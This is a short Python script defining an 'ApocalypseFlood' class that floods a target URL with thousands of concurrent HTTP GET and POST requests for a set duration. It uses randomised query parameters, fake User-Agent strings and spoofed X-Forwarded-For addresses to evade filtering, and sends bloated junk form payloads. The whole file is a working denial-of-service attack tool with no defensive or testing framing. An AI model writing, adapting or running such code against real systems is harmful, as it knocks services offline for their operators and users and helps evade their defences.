import asyncio
import aiohttp
import random

class ApocalypseFlood:
    def __init__(self, target, concurrency=2000, duration=180):
        self.target = target
        self.concurrency = concurrency
        self.duration = duration
        self.stopped = False

    async def _chaos_session(self, session):
        while not self.stopped:
            try:
                params = {f"null{i}": random.randint(0, 999999) for i in range(10)}
                headers = {
                    "User-Agent": f"NullStorm/{random.randint(1,9)}.{random.randint(0,99)}",
                    "Accept": "*/*",
                    "Range": f"bytes={random.randint(0,100000)}-{random.randint(100001,999999)}",
                    "Connection": "keep-alive",
                    "Cache-Control": "no-cache",
                    "X-Forwarded-For": f"{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}"
                }
                async with session.get(self.target, params=params, headers=headers, timeout=aiohttp.ClientTimeout(total=3)) as resp:
                    pass
                data = {"payload": "A" * random.randint(5000, 15000)}
                async with session.post(self.target, data=data, headers={"Content-Type": "application/x-www-form-urlencoded"}, timeout=3) as resp:
                    pass
            except:
                pass

    async def _start_apocalypse(self):
        connector = aiohttp.TCPConnector(limit=0, force_close=False)
        timeout = aiohttp.ClientTimeout(total=None, connect=5, sock_read=5)
        async with aiohttp.ClientSession(connector=connector, timeout=timeout) as session:
            tasks = [asyncio.create_task(self._chaos_session(session)) for _ in range(self.concurrency)]
            await asyncio.sleep(self.duration)
            self.stopped = True
            for task in tasks:
                task.cancel()
            await asyncio.gather(*tasks, return_exceptions=True)